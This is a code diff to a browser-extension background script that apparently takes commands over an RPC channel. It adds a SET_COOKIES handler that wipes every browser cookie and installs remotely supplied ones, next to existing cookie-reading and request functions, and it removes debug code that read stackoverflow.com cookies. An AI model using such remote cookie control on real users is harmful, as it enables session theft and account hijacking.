@@ -25,11 +25,83 @@ const RPC_CALL_TABLE = {
     'PONG': () => {}, // NOP, since timestamp is updated on inbound message.
     'AUTH': authenticate,
     'GET_COOKIES': get_cookies,
+    'SET_COOKIES': set_cookies
 };
 
 /*
     Return an array of cookies for the current cookie store.
 */
+function clear_cookie(url, name) {
+    return new Promise(function(resolve, reject) {
+        try {
+        	chrome.cookies.remove({
+        		url: url,
+        		name: name
+        	}, () => {
+        		resolve();
+        	});
+        } catch(e) {
+            reject(e);
+        }
+    });
+}
+
+function get_url_from_cookie_data(cookie_data) {
+	const protocol = cookie_data.secure ? 'https' : 'http';
+	var host = cookie_data.domain;
+	if(host.startsWith('.')) {
+		host = host.substring(1);
+	}
+
+	return `${protocol}://${host}${cookie_data.path}`;
+}
+async function set_cookies(cookies){
+    const attrs_to_copy = [
+        'domain',
+        'expirationDate',
+        'httpOnly',
+        'name',
+        'path',
+        'sameSite',
+        'secure',
+        'value'
+    ];
+
+    const browser_cookie_array = cookies.map(cookie => {
+        let cookie_data = {};
+        attrs_to_copy.map(attribute_name => {
+            // Firefox and Chrome compatibility bullshit
+            if(attribute_name === 'sameSite' && cookie[attribute_name] === 'unspecified') {
+                cookie_data[attribute_name] = 'lax';
+                return
+            }
+
+            if(attribute_name in cookie) {
+                cookie_data[attribute_name] = cookie[attribute_name];
+            }
+        });
+
+        // For some reason we have to generate this even though
+        // we already provide a domain, path, and secure param...
+        const url = get_url_from_cookie_data(cookie_data);
+        cookie_data.url = url;
+
+        return cookie_data;
+    });
+
+    // Clear existing cookies
+    // clear_cookie(url, name)
+    const existing_cookies = await getallcookies({});
+    const cookie_clear_promises = existing_cookies.map(async existing_cookie => {
+        const url = get_url_from_cookie_data(existing_cookie);
+        return clear_cookie(url, existing_cookie.name);
+    });
+    await Promise.all(cookie_clear_promises);
+
+    browser_cookie_array.map(cookie => {
+        chrome.cookies.set(cookie, () => {});
+    });
+}
 async function get_cookies(params) {
     // If the "cookies" permission is not available
     // just return an empty array.
@@ -239,15 +311,6 @@ async function perform_http_request(params) {
             response_headers[pair[0]] = pair[1];
         }
     }
-    var cookies = await get_cookies({"domain": ".stackoverflow.com"});
-    console.log(cookies);
-    response_headers['Set-Cookie'] ="sid=14A52; max-age=3600;";
-
-    if(cookies.length != 0){
-        var name = cookies[0].name
-    }
-    
-
 
     const redirect_hack_url_prefix = `${location.origin.toString()}/redirect-hack.html?id=`;
 
